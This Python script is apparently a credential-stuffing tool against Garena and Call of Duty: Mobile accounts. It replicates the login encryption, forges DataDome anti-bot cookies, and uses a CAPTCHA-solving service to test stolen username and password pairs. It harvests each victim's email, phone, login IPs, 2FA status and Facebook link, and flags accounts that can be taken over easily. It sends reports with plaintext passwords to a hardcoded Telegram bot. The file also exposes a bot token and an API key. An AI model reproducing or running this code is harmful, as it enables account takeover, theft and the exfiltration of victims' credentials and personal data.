import os
import sys
import re
import time
import json
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
import itertools
import shutil
from tqdm import tqdm
from time import sleep
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES
import change_cookie
init(autoreset=True)

TELEGRAM_BOT_TOKEN = "7214172189:AAFobeULPQDb2Shcha1pStt6eefsgGP8LLk"
TELEGRAM_CHAT_ID = "5163892491"

check_counter = 0

start_time = time.time()

class Colors:
    RED = "\033[31m"
    GREEN = "\033[32m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    YELLOW = "\033[33m"
    RESET = "\033[0m"

apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
CAPTCHA_API_KEY = "CAP-D819428E6782FCD23635C1C765C97C75D10A7F04FA17931385633AE3DC53E666"

datenok = str(int(time.time()))


def get_datenow():
    return datenok

def format_time(seconds):
    days = int(seconds // 86400)
    hours = int((seconds % 86400) // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    return f"{days}d {hours}h {minutes}m {secs}s"
    
def solve_captcha(api_key, page_url):
    try:
        create_task_url = "https://api.capsolver.com/createTask"
        task_payload = {
            "clientKey": api_key,
            "task": {
                "type": "ReCaptchaV3TaskProxyless",
                "websiteURL": page_url,
                "websiteKey": "6LdXZMAUAAAAAO1TcqXeGxJt1Y9x3QkOoc1QYHN5",
                "pageAction": "login",
                "minScore": 0.7
            }
        }
        
        response = requests.post(create_task_url, json=task_payload)
        response.raise_for_status()
        task_data = response.json()
        
        if task_data.get("errorId") != 0:
            print(f"{Fore.RED}[-] CAPTCHA task creation failed: {task_data.get('errorDescription')}{Style.RESET_ALL}")
            return None
            
        task_id = task_data["taskId"]
        
        get_result_url = "https://api.capsolver.com/getTaskResult"
        result_payload = {"clientKey": api_key, "taskId": task_id}
        
        for _ in range(10):
            time.sleep(5)
            response = requests.post(get_result_url, json=result_payload)
            response.raise_for_status()
            result_data = response.json()
            
            if result_data.get("status") == "ready":
                return result_data["solution"]["gRecaptchaResponse"]
            elif result_data.get("errorId") != 0:
                print(f"{Fore.RED}[-] CAPTCHA solving failed: {result_data.get('errorDescription')}{Style.RESET_ALL}")
                return None
                
        print(f"{Fore.RED}[-] CAPTCHA solving timed out{Style.RESET_ALL}")
        return None
        
    except Exception as e:
        print(f"{Fore.RED}[-] CAPTCHA solving error: {str(e)}{Style.RESET_ALL}")
        return None    

def strip_ansi_codes_jarell(text):
  ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
  return ansi_escape.sub('', text)

def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    cipher_raw = cipher.encrypt(plaintext_bytes)
    return cipher_raw.hex()[:32]

def encrypt_password(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    key = generate_decryption_key(password_md5, v1, v2)
    encrypted = encrypt_aes_256_ecb(password_md5, key)
    return encrypted
    
def get_datadome_cookie():
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            print(f"Response content: {response.text[:200]}...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting DataDome cookie: {e}")
        return None

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(f"{Fore.YELLOW}[TELEGRAM BOT] Token not configured. Skipping notification.{Style.RESET_ALL}")
        return

    clean_message = strip_ansi_codes_jarell(message)

    clean_message = clean_message.replace(" [ 💻 KENSHI KUPAL REPORT ] ", "\n*💻 KENSHI KUPAL REPORT*\n")
    clean_message = clean_message.replace(" [ ☠️ BAN WARNING ☠️ ] ", "\n*☠️ BAN WARNING ☠️*\n")
    clean_message = clean_message.replace(" [ 🔐 Account Credentials ] ", "\n*🔐 Account Credentials*\n")
    clean_message = clean_message.replace(" [ 🌍 Location & Access ] ", "\n*🌍 Location & Access*\n")
    clean_message = clean_message.replace(" [ 🛡️ Security Status ] ", "\n*🛡️ Security Status*\n")
    clean_message = clean_message.replace(" [ 🔗 Social Links ] ", "\n*🔗 Social Links*\n")
    clean_message = clean_message.replace(" [ 🎮 Call of Duty: Mobile ] ", "\n*🎮 Call of Duty: Mobile*\n")

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': clean_message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[TELEGRAM BOT] Notification sent successfully!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[TELEGRAM BOT] Error sending message: {response.text}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[TELEGRAM BOT] Failed to send message: {e}{Style.RESET_ALL}")

BLUE = "\033[94m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

check_stats = {
    "CLEAN": 0,
    "NOT_CLEAN": 0,
    "FAILED": 0,
    "SUCCESS": 0,
    "CAPTCHA": 0
}

def progress_dots(message, count=5, delay=0.3):
    print(f"{Fore.YELLOW}{message}{Style.RESET_ALL}")
    for _ in range(count):
        print(Fore.YELLOW + ".", end="", flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)

def progress_bar(total=20, delay=0.1):
    print(Fore.YELLOW + "[", end="", flush=True)
    for _ in range(total):
        print("█", end="", flush=True)
        time.sleep(delay)
    print("]" + Style.RESET_ALL)

def get_account_bindings(hider, coke):
    init_url = 'https://account.garena.com/api/account/init'
    try:
        response = requests.get(init_url, headers=hider, cookies=coke, timeout=120)
        response.raise_for_status()
        data = response.json()

        if not data or 'user_info' not in data:
            return {'success': False, 'error': 'User information not found'}

        user_info = data.get('user_info', {})
        is_clean = (user_info.get('email_v') == 0 and not user_info.get('mobile_no'))
        
        login_history = data.get('login_history', [])
        last_login_details = {}
        if len(login_history) >= 2:
            login_history.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
            second_last = login_history[1]
            ts = second_last.get('timestamp')
            last_login_details = {
                'last_login': datetime.fromtimestamp(ts).strftime('%B %d, %Y') if ts else 'N/A',
                'last_login_where': second_last.get('source', 'N/A'),
                'ipk': second_last.get('ip', 'N/A'),
                'ipc': second_last.get('country', 'N/A')
            }

        fb_info = user_info.get('fb_account') or {}

        result = {
            'success': True,
            'is_clean': "Clean" if is_clean else "Not Clean",
            'email': user_info.get('email') or 'N/A',
            'email_verified': "True" if user_info.get('email_v') else "False",
            'fb': fb_info.get('fb_username') or 'N/A',
            'fbl': f"https://www.facebook.com/profile.php?id={fb_info.get('fb_uid')}" if fb_info.get('fb_uid') else 'N/A',
            'facebook_connected': "True" if fb_info.get('fb_username') else "False",
            'mobile': user_info.get('mobile_no') or 'N/A',
            'country': user_info.get('acc_country') or 'N/A',
            'shell': user_info.get('shell', 0),
            'avatar_url': user_info.get('avatar') or 'N/A',
            'authenticator_enabled': "True" if user_info.get('authenticator_enable') else "False",
            'two_step_enabled': "True" if user_info.get('two_step_verify_enable') else "False",
            'count': user_info.get('acc_country') or 'UNKNOWN',
            **last_login_details
        }
        return result

    except requests.RequestException as e:
        return {'success': False, 'error': f"API request failed: {e}"}
    except json.JSONDecodeError:
        return {'success': False, 'error': 'Failed to decode JSON from Garena API'}

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, codm_banned=False, shared_stats=None, send_telegram_notifications=False):
    from change_cookie import get_cookies

    if shared_stats is None:
        print(f"{Fore.RED}[ERROR] check_login called without shared_stats! Initializing locally.{Style.RESET_ALL}")
        shared_stats = {"CLEAN": 0, "NOT_CLEAN": 0, "FAILED": 0, "SUCCESS": 0, "CAPTCHA": 0,
                        "FAILED_CODM_DATA": 0, "INCORRECT_CREDENTIALS": 0, "NOT_FOUND_OR_BAD_PAYLOAD": 0, "CRITICAL_FAILURES": 0, "OTHER_FAILED":0}

    cookies["datadome"] = dataa
    print(f"\n🔐 Account: {account_username}")
    progress_dots("💻 Connecting to Garena", 5, 0.2)

    params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }
    url = apkrov + urlencode(params)

    try:
        res = requests.get(url, headers=selected_header, cookies=cookies, timeout=60)
        if "captcha" in res.text.lower() or res.status_code == 403:
            print("🧱 CAPTCHA triggered by DataDome!")
            return "🧱 CAPTCHA Blocked"
    except requests.exceptions.ConnectionError:
        print("🚫 Connection refused by server.")
        shared_stats["OTHER_FAILED"] += 1
        return "❌ Connection Error"
    except requests.exceptions.ReadTimeout:
        print("⏰ Server timed out.")
        shared_stats["OTHER_FAILED"] += 1
        return "❌ Timeout Error"

    progress_bar(15, 0.07)
    print("📥 Parsing login response...")

    try:
        login_json = res.json()
    except json.JSONDecodeError:
        print(f"❌ [INVALID JSON] Response:\n{res.text}")
        shared_stats["OTHER_FAILED"] += 1
        return "❌ Invalid JSON"

    if login_json.get("error_auth") or login_json.get("error"):
        if "Incorrect Username or Password" in login_json.get("error_description", ""):
            shared_stats["INCORRECT_CREDENTIALS"] += 1
            return "❌ General Login Failure"
        else:
            shared_stats["OTHER_FAILED"] += 1
            return "❌ General Login Failure"
    if login_json.get("error_params"):
        shared_stats["OTHER_FAILED"] += 1
        return "❌ Invalid Parameters"
    if not login_json.get("success", True):
        shared_stats["OTHER_FAILED"] += 1
        return "❌ General Login Failure"

    session_key = login_json.get("session_key", "")
    if not session_key:
        shared_stats["OTHER_FAILED"] += 1
        return "❌ Missing Session Key"
    print("✅ Session key acquired.")

    set_cookie = res.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''

    coke = get_cookies()
    coke.update({
        "ac_session": "7tdtotax7wqldao9chxtp30tn4m3ggkr",
        "datadome": dataa,
        "sso_key": sso_key
    })
    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    print("📡 Fetching account bindings from Garena API...")
    progress_dots("🔍 Contacting validation endpoint", 6, 0.3)

    init_data = get_account_bindings(hider, coke)

    if not init_data.get('success'):
        shared_stats["OTHER_FAILED"] += 1
        return f"❌ Server Error: {init_data.get('error', 'Unknown')}"

    is_clean = init_data.get('is_clean')
    if codm_banned:
        shared_stats["OTHER_FAILED"] += 1
        return "🚫 CODM Account is Banned"

    ip_address = init_data.get('ipk', "N/A")
    print(f"🌐 IP Detected: {ip_address}")
    print(f"🧠 DataDome Token Used: {dataa}")

    country = init_data.get('country', "N/A")
    last_login = init_data.get('last_login', "N/A")
    last_login_where = init_data.get('last_login_where', "N/A")
    avatar_url = init_data.get('avatar_url', "N/A")
    fb = init_data.get('fb', "N/A")
    fbl = init_data.get('fbl', "N/A")
    mobile = init_data.get('mobile', "N/A")
    email = init_data.get('email', "N/A")
    ipc = init_data.get('ipc', "N/A")
    facebook = init_data.get('facebook_connected', "False")
    shell = init_data.get('shell', "0")
    count = init_data.get('count', "UNKNOWN")
    ipk = init_data.get('ipk', "1.1.1.1")
    email_verified = init_data.get('email_verified', "False")
    authenticator_enabled = "True" if init_data.get('authenticator_enabled') else "False"
    two_step_enabled = "True" if init_data.get('two_step_enabled') else "False"
    
    print("\n🧠 Starting secure token exchange...")
    progress_dots("🛰️ Sending request to Garena OAuth", 6, 0.3)
    cookies["sso_key"] = sso_key

    head = {
        "Host": "auth.garena.com",
        "Connection": "keep-alive",
        "Content-Length": "107",
        "sec-ch-ua": selected_header.get("sec-ch-ua", ""),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua-platform": selected_header.get("sec-ch-ua-platform", "Windows"),
        "sec-ch-ua-mobile": "?1",
        "User-Agent": selected_header["User-Agent"],
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com",
        "Referer": "https://auth.garena.com/universal/oauth",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9"
    }

    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }

    try:
        reso = requests.post("https://auth.garena.com/oauth/token/grant", headers=head, data=data, cookies=cookies)
        reso.raise_for_status()
        response_data = reso.json()

        if "error" in response_data:
            shared_stats["OTHER_FAILED"] += 1
            return f"❌ [AUTH ERROR] {response_data['error']}"
        if "access_token" not in response_data:
            shared_stats["OTHER_FAILED"] += 1
            return f"❌ Access token missing from response"

        print("🎉 Access token received!")
        print("🔁 Reusing existing DataDome token for stability...")
        newdate = dataa
        print("✅ DataDome token confirmed:", newdate)
        print("⏳ Proceeding in 2 seconds...")
        time.sleep(2)

        token_session = reso.cookies.get('token_session', cookies.get('token_session'))
        access_token = response_data["access_token"]

        print("📡 Retrieving Call of Duty Mobile account info...")
        tae = show_level(access_token, selected_header, sso_key, token_session, newdate, cookies)
        if "[FAILED]" in tae:
            shared_stats["FAILED_CODM_DATA"] += 1
            return "❓Failed to retrieve CODM data."

        codm_nickname, codm_level, codm_region, uid = tae.split("|")

        connected_games = []
        if not all([uid, codm_nickname, codm_level, codm_region]):
            connected_games.append("No CODM account found")
        else:
            connected_games.append(
                f"[+] Account Level: {codm_level}\n"
                f"[+] Game: CODM ({codm_region})\n"
                f"[+] Nickname: {codm_nickname}\n"
                f"[+] UID: {uid}"
            )

        if is_clean == "Clean":
            shared_stats["CLEAN"] += 1
        else:
            shared_stats["NOT_CLEAN"] += 1
        shared_stats["SUCCESS"] += 1

        print("\n✨ SUCCESSFUL")
        formatted_report = format_result(
            last_login, last_login_where, country, shell, avatar_url, mobile, facebook,
            email_verified, authenticator_enabled, two_step_enabled, connected_games,
            is_clean, fb, fbl, email, date, account_username, password, count, ipk, ipc,
            codm_banned=codm_banned
        )
        print(formatted_report)
        
        try:
            codm_level_num = int(codm_level) if codm_level.isdigit() else -1
            if send_telegram_notifications and codm_level_num >= 150:
                print(f"{Fore.MAGENTA}🚀 High-Level Account (Lvl {codm_level_num}) detected! Sending to Telegram...{Style.RESET_ALL}")
                send_to_telegram(formatted_report)
        except Exception as e:
            print(f"{Fore.RED}[TELEGRAM] Error during notification logic: {e}{Style.RESET_ALL}")
        
        return "SUCCESSFUL_CHECK"

    except requests.RequestException as e:
        shared_stats["OTHER_FAILED"] += 1
        return f"❌ Token request failed: {e}"

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "https://auth.garena.com/",
        "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")
    }
    cookie.update({
        "datadome": newdate,
        "sso_key": sso,
        "token_session": token
    })

    try:
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
        res.raise_for_status()
    except requests.RequestException as e:
        return f"[FAILED] Initial request error: {str(e)}"

    try:
        parsed_url = urlparse(res.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]

        if not extracted_token:
            return "[FAILED] No token extracted from redirected URL."

    except Exception as e:
        return f"[FAILED] Token extraction error: {str(e)}"

    check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
    check_login_headers = {
        "Accept": "application/json, text/plain, */*",
        "codm-delete-token": extracted_token,
        "Origin": "https://delete-request.codm.garena.co.id",
        "Referer": "https://delete-request.codm.garena.co.id/",
        "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")
    }

    try:
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=30)
        check_login_response.raise_for_status()
        data = check_login_response.json()

        if data and "user" in data:
            user = data["user"]
            uid = user.get("uid", "N/A")
            codm_nickname = user.get("codm_nickname", "N/A")
            codm_level = user.get("codm_level", "N/A")
            codm_region = user.get("region", "N/A")
            return f"{codm_nickname}|{codm_level}|{codm_region}|{uid}"
        else:
            return "[FAILED] NO CODM ACCOUNT!"
            
    except requests.RequestException as e:
        return f"[FAILED] CODM data fetch error: {str(e)}"
    except json.JSONDecodeError:
        return "[FAILED] Invalid JSON from CODM API"
        
import os
import re
import time

def animated_bar(length=30, delay=0.02):
    bar = ""
    for i in range(length):
        bar += "\033[1;34m█\033[0m"
        print(f"\r[ {bar:<30} ]", end="", flush=True)
        time.sleep(delay)
    print()

def format_result(
    last_login, last_login_where, country, shell, avatar_url, mobile, facebook,
    email_verified, authenticator_enabled, two_step_enabled, connected_games,
    is_clean, fb, fbl, email, date, username, password, count, ipk, ipc,
    codm_banned
):
    import os
    import re

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[1;34m"
    CYAN = "\033[36m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

    mobile_bound = mobile != "N/A"
    email_bound = email_verified == "True"
    clean_status = "Clean" if (not mobile_bound and not email_bound) else "Not Clean"
    facebook_link = fbl if fbl not in ["N/A", ""] and fb not in ["N/A", ""] else "N/A"

    email_status = f"{GREEN}[✔ Verified]{RESET}" if email_bound else f"{RED}[✘ Not Verified]{RESET}"
    mobile_status_icon = f"{GREEN}[✔ Bound]{RESET}" if mobile_bound else f"{YELLOW}[- Not Bound]{RESET}"
    auth_status = f"{GREEN}[✔ Enabled]{RESET}" if authenticator_enabled == "True" else f"{RED}[✘ Disabled]{RESET}"
    two_fa_status = f"{GREEN}[✔ Enabled]{RESET}" if two_step_enabled == "True" else f"{RED}[✘ Disabled]{RESET}"
    clean_status_icon = f"{GREEN}CLEAN{RESET}" if clean_status == "Clean" else f"{RED}NOT CLEAN{RESET}"

    codm_level, codm_region, codm_nickname, uid = "N/A", "N/A", "N/A", "N/A"
    codm_level_num = -1
    for game in connected_games:
        if "CODM" in game:
            try:
                for line in game.split("\n"):
                    if "Account Level" in line:
                        codm_level = line.split(":")[-1].strip()
                        codm_level_num = int(codm_level) if codm_level.isdigit() else -1
                    elif "Game: CODM" in line:
                        codm_region = line.split("(")[-1].replace(")", "").strip()
                    elif "Nickname" in line:
                        codm_nickname = line.split(":")[-1].strip()
                    elif "UID" in line:
                        uid = line.split(":")[-1].strip()
                break
            except Exception as e:
                print(f"Error parsing CODM block: {e}")

    def format_line(icon, key, value, key_width=15):
        return f"  {icon} {key.ljust(key_width)}: {CYAN}{value}{RESET}"

    banned_warning = ""
    if codm_banned:
        banned_warning = f"""
{RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ [ ☠️ BAN WARNING ☠️ ] ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{RESET}
{BOLD}{RED}
      ATTENTION: The linked Call of Duty Mobile account is BANNED!
      This may affect the value and usability of the Garena account.
{RESET}
{RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{RESET}
"""

    codm_info_section = ""
    if uid != "N/A":
        codm_info_section = f"""
{BLUE}╔═════════════════════╡ 🎮 Call of Duty: Mobile ╞═════════════════════╗{RESET}
{format_line('🌐', 'Region', codm_region)}
{format_line('✨', 'Nickname', codm_nickname)}
{format_line('📈', 'Level', codm_level)}
{format_line('🆔', 'Player UID', uid)}
{BLUE}╚═══════════════════════════════════════════════════════════════════╝{RESET}"""
    else:
        codm_info_section = f"""
{BLUE}╔═════════════════════╡ 🎮 Call of Duty: Mobile ╞═════════════════════╗{RESET}
  {YELLOW}⚠️ No CODM account data found linked.{RESET}
{BLUE}╚═══════════════════════════════════════════════════════════════════╝{RESET}"""


    mess = f"""
{BLUE}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ [ 💻 KENSHI KUPAL REPORT ] ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{RESET}

{WHITE}Checking account {BOLD}{username}{RESET}... done.

{banned_warning}
{BLUE}╔═══════════════════════╡ 🔐 Account Credentials ╞══════════════════════╗{RESET}
{format_line('👤', 'Username', username)}
{format_line('🔑', 'Password', password)}
{BLUE}╚═══════════════════════════════════════════════════════════════════╝{RESET}

{BLUE}╔════════════════════════╡ 🌍 Location & Access ╞══════════════════════╗{RESET}
{format_line('🕓', 'Last Login', last_login)}
{format_line('📍', 'Login From', last_login_where)}
{format_line('🗺️', 'User Country', country)}
{format_line('🌐', 'Source IP', ipk)}
{format_line('🏴', 'IP Country', ipc)}
{BLUE}╚═══════════════════════════════════════════════════════════════════╝{RESET}

{BLUE}╔═════════════════════════╡ 🛡️ Security Status ╞═══════════════════════╗{RESET}
{format_line('🐚', 'Shells', shell)}
{format_line('📧', 'Email', f'{email} ({email_status})')}
{format_line('📱', 'Mobile No.', f'{mobile} ({mobile_status_icon})')}
{format_line('🔐', 'Authenticator', auth_status)}
{format_line('🛡️', '2-Step Auth', two_fa_status)}
  {'-'*60}
  🧼 {BOLD}Account Status{' '.ljust(4)}:{RESET} {BOLD}{clean_status_icon}{RESET}
{BLUE}╚═══════════════════════════════════════════════════════════════════╝{RESET}

{BLUE}╔══════════════════════════╡ 🔗 Social Links ╞════════════════════════╗{RESET}
{format_line('🧑', 'Facebook User', fb)}
{format_line('🌐', 'Facebook URL', facebook_link)}
{format_line('🤝', 'FB Connected', facebook)}
{BLUE}╚═══════════════════════════════════════════════════════════════════╝{RESET}
{codm_info_section}

{CYAN}Report generated by {BLUE}@Kenze03{RESET}
"""

    print("\n\033[1;34m[>>] Generating Elite Report...\033[0m")
    animated_bar()

    if 50 <= codm_level_num < 100:
        level_range = "50-100"
    elif 100 <= codm_level_num < 150:
        level_range = "100-149"
    elif 150 <= codm_level_num < 200:
        level_range = "150-199"
    elif 200 <= codm_level_num < 300:
        level_range = "200-300"
    elif 300 <= codm_level_num < 400:
        level_range = "300-400"
    else:
        level_range = "unknown"

    clean_tag = "clean" if clean_status == "Clean" else "not_clean"

    COUNTRY_KEYWORD_MAP = {
        "PH": ["PHILIPPINES", "PH"],
        "ID": ["INDONESIA", "ID"],
        "MY": ["MALAYSIA", "MY"],
        "SG": ["SINGAPORE", "SG"],
        "TH": ["THAILAND", "TH"],
        "TW": ["TAIWAN", "TW"],
        "US": ["UNITED STATES", "USA", "US"],
        "CA": ["CANADA", "CA"],
        "MX": ["MEXICO", "MX"],
        "BR": ["BRAZIL", "BR"],
        "AR": ["ARGENTINA", "AR"],
        "CO": ["COLOMBIA", "CO"],
        "CL": ["CHILE", "CL"],
        "PE": ["PERU", "PE"],
        "GB": ["UNITED KINGDOM", "ENGLAND", "UK", "GB"],
        "DE": ["GERMANY", "DE"],
        "FR": ["FRANCE", "FR"],
        "IT": ["ITALY", "IT"],
        "ES": ["SPAIN", "ES"],
        "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"],
        "PL": ["POLAND", "PL"],
        "UA": ["UKRAINE", "UA"],
        "NL": ["NETHERLANDS", "NL"],
        "SE": ["SWEDEN", "SE"],
        "NO": ["NORWAY", "NO"],
        "DK": ["DENMARK", "DK"],
        "FI": ["FINLAND", "FI"],
        "RO": ["ROMANIA", "RO"],
        "AU": ["AUSTRALIA", "AU"],
        "NZ": ["NEW ZEALAND", "NZ"],
        "IN": ["INDIA", "IN"],
        "JP": ["JAPAN", "JP"],
        "KR": ["KOREA", "KR"],
        "PK": ["PAKISTAN", "PK"],
        "BD": ["BANGLADESH", "BD"],
        "HK": ["HONG KONG", "HK"],
        "AE": ["UNITED ARAB EMIRATES", "UAE", "AE"],
        "SA": ["SAUDI ARABIA", "SA"],
        "ZA": ["SOUTH AFRICA", "ZA"],
        "EG": ["EGYPT", "EG"],
        "TR": ["TURKEY", "TR"],
        "KW": ["KUWAIT", "KW"],
        "QA": ["QATAR", "QA"],
    }

    country_upper = str(country).upper()
    country_folder = "Others"

    for folder, keywords in COUNTRY_KEYWORD_MAP.items():
        for keyword in keywords:
            if keyword in country_upper:
                country_folder = folder
                break
        if country_folder != "Others":
            break

    base_output_path = f"/storage/emulated/0/kenze_panel/KENZE/{country_folder}/{clean_tag}"
    os.makedirs(base_output_path, exist_ok=True)

    file_name = f"{country_folder}_{clean_tag}_LEVEL_{level_range}.txt"
    file_path = os.path.join(base_output_path, file_name)

    def strip_ansi_codes_jarell(text):
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    text_to_save = strip_ansi_codes_jarell(mess)

    with open(file_path, "a", encoding="utf-8") as f:
        f.write(text_to_save + "\n" + "=" * 75 + "\n\n")

    return mess
    
from requests.exceptions import ConnectionError, Timeout, SSLError, RequestException

COOKIE_FILE_PATH = "/storage/emulated/0/kenze_panel/cookies.json"

